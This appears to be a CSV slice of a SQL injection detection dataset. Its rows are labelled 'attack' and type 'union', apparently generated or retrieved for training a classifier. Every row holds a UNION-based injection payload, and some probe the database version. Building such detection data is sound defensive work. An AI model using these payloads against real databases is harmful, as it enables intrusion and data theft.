id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000086,attack,union,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",nearest_attack_euclidean,R000298,4.740839808032603
CTGAN_000087,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,3.9331383394945694
CTGAN_000088,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000157,5.159653565554983
CTGAN_000089,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000190,5.3424558563780264
CTGAN_000090,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000495,5.871750602268795
CTGAN_000091,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R000222,6.1669434671767185
CTGAN_000092,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000359,4.894542491266899
CTGAN_000093,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.654588306084241
CTGAN_000094,attack,union,"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",nearest_attack_euclidean,R000675,6.832728682143749
CTGAN_000095,attack,union,"-7635"" union all select 1284,1284,1284,1284,1284,1284#",nearest_attack_euclidean,R000196,7.531256753684769
CTGAN_000096,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000504,5.517105138967437
CTGAN_000097,attack,union,"-8098%'  )   union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",nearest_attack_euclidean,R000238,5.514231614582828
CTGAN_000098,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000186,6.2417462848084355
CTGAN_000099,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,5.174726871202128
CTGAN_000100,attack,union,"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",nearest_attack_euclidean,R000183,6.671103263155098
CTGAN_000101,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,4.805063238471867
CTGAN_000102,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000282,6.914746813546237
CTGAN_000103,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,6.39615119088937
CTGAN_000104,attack,union," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000106,6.719929559325287
CTGAN_000105,attack,union,"1'+  (  select kpso where 1226  =  1226 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000350,4.928208962718101
CTGAN_000106,attack,union," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000036,6.404292588412912
CTGAN_000107,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000680,6.327243446176404
CTGAN_000108,attack,union,"1'||  (  select 'zdfo' from dual where 4288  =  4288 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000747,6.86426104972099
CTGAN_000109,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.584187405268927
CTGAN_000110,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,5.9976014639000335
CTGAN_000111,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000294,7.332048589798816
CTGAN_000112,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000421,5.7014440563009
CTGAN_000113,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000282,5.42929773952022
CTGAN_000114,attack,union,1'||  (  select 'owzs' where 1475  =  1475 union all select null--,nearest_attack_euclidean,R000724,5.288564847603479
CTGAN_000115,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000186,4.932133445162419
CTGAN_000116,attack,union,"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",nearest_attack_euclidean,R000251,6.480388377795194
CTGAN_000117,attack,union,"-5372""  )   as wlqm where 2432  =  2432 union all select 2432,2432,2432,2432,2432,2432#",nearest_attack_euclidean,R000324,5.2225947568471724
CTGAN_000118,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000525,4.291439307092684
CTGAN_000119,attack,union,"-9256""   )    )    union all select 2977,2977,2977,2977,2977,2977,2977--",nearest_attack_euclidean,R000635,4.283108305841332
CTGAN_000120,attack,union,"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",nearest_attack_euclidean,R000423,5.159979419250968
CTGAN_000121,attack,union,"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",nearest_attack_euclidean,R000714,5.376033437175874
CTGAN_000122,attack,union,"1'||  (  select 'jzwq' where 3289  =  3289 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000642,5.7439097221778015
CTGAN_000123,attack,union,"-6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",nearest_attack_euclidean,R000260,5.014530812903509
CTGAN_000124,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000081,6.180645773392473
CTGAN_000125,attack,union,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",nearest_attack_euclidean,R000289,3.7882902825906446
CTGAN_000126,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000514,7.368487114698798
CTGAN_000127,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,5.703301945708912
CTGAN_000128,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,5.467486430201822
CTGAN_000129,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,4.367003668979644
CTGAN_000130,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000554,5.898661130436375
CTGAN_000131,attack,union,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000458,5.0317589262305695
CTGAN_000132,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,4.818385417765614
CTGAN_000133,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000504,4.636857219937888
CTGAN_000134,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000525,6.508936906158786
CTGAN_000135,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,4.432896750521221
CTGAN_000136,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000219,5.738522200982669
CTGAN_000137,attack,union,"-1949""   )    )    as urke where 8761  =  8761 union all select 8761,8761,8761,8761,8761,8761,8761#",nearest_attack_euclidean,R000272,5.031660377516043
CTGAN_000138,attack,union,"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--",nearest_attack_euclidean,R000212,5.971787961341538
CTGAN_000139,attack,union,"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",nearest_attack_euclidean,R000470,5.555189045866309
CTGAN_000140,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000319,7.0795779447236455
CTGAN_000141,attack,union,"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",nearest_attack_euclidean,R000573,6.006808024493293
CTGAN_000142,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000474,4.744880949389356
CTGAN_000143,attack,union,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000458,5.167171608152128
CTGAN_000144,attack,union,"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",nearest_attack_euclidean,R000265,6.41601666317904
CTGAN_000145,attack,union,"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",nearest_attack_euclidean,R000714,5.24716987394015
CTGAN_000146,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000413,6.414359388872615
CTGAN_000147,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000761,5.744103421273246
CTGAN_000148,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000198,5.838767752135635
CTGAN_000149,attack,union,"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",nearest_attack_euclidean,R000211,4.736893742993715
CTGAN_000150,attack,union,"-6360'  )   as yfrk where 3683  =  3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",nearest_attack_euclidean,R000443,3.9299565328570742
CTGAN_000151,attack,union,"-5702'   )    )     )   union all select 7806,7806,7806,7806,7806--",nearest_attack_euclidean,R000699,4.603357530392429
CTGAN_000152,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000556,4.909361119739504
CTGAN_000153,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000177,6.681157264519815
CTGAN_000154,attack,union,"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",nearest_attack_euclidean,R000394,5.721242426543769
CTGAN_000155,attack,union,"-2889   )    )    as iqzv where 1786  =  1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",nearest_attack_euclidean,R000440,5.1529808492946865
CTGAN_000156,attack,union,"-1150'  )   as hdby where 4032  =  4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",nearest_attack_euclidean,R000497,6.027819648714622
CTGAN_000157,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000556,5.966928565436909
CTGAN_000158,attack,union,"-8093""   )    )    as oboi where 1476  =  1476 union all select 1476,1476,1476,1476#",nearest_attack_euclidean,R000333,5.611502557008195
CTGAN_000159,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,4.138880974488701
CTGAN_000160,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,4.390468092336184
CTGAN_000161,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000429,4.679976299774983
CTGAN_000162,attack,union,"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",nearest_attack_euclidean,R000352,5.699476997261513
CTGAN_000163,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000429,5.697701857590953
CTGAN_000164,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000144,5.73652293519362
CTGAN_000165,attack,union,"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",nearest_attack_euclidean,R000183,7.2078717892940185
CTGAN_000166,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000081,6.576810563333294
CTGAN_000167,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,5.694073040822138
CTGAN_000168,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000556,6.576968090274514
CTGAN_000169,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.713951684514895
CTGAN_000170,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000576,7.1019049000895205
CTGAN_000171,attack,union,"-7868' in boolean mode  )   union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",nearest_attack_euclidean,R000309,4.315390877697619
CTGAN_000172,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,4.540829458061894
CTGAN_000173,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000571,5.790403607952705
CTGAN_000174,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000246,5.309006545622029
CTGAN_000175,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000421,4.720061355385807
CTGAN_000176,attack,union,"-5360' where 8178  =  8178 union all select 8178,8178,8178--",nearest_attack_euclidean,R000616,5.66366914485665
CTGAN_000177,attack,union,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000458,5.654551420168579
CTGAN_000178,attack,union,"-5595""   )    )    as xttj where 4562  =  4562 union all select 4562,4562,4562,4562,4562#",nearest_attack_euclidean,R000749,5.722387736724318
CTGAN_000179,attack,union,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",nearest_attack_euclidean,R000549,5.116839026761465
CTGAN_000180,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000177,5.675912279208
